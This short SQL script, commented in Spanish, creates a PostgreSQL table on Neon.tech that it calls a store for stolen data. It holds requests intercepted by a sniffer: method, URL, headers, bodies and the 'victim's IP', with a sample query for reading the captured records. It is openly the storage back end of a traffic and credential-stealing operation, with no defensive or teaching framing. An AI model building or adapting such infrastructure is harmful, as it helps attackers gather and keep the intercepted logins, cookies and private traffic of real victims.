-- Script para crear la tabla de datos robados en Neon.tech (PostgreSQL)

CREATE TABLE IF NOT EXISTS sniffed_data (
    id SERIAL PRIMARY KEY,
    timestamp TEXT,             -- Formato ISO de fecha del sniffer
    method VARCHAR(10),        -- GET, POST, etc.
    url TEXT,                  -- URL interceptada
    headers JSONB,             -- Encabezados en formato JSON
    body JSONB,                -- Cuerpo del mensaje en formato JSON
    client_ip VARCHAR(50),     -- IP de la víctima
    captured_at TIMESTAMPTZ DEFAULT NOW() -- Momento en que llegó a la DB
);

-- Ejemplo de consulta para ver los datos:
-- SELECT * FROM sniffed_data ORDER BY captured_at DESC;
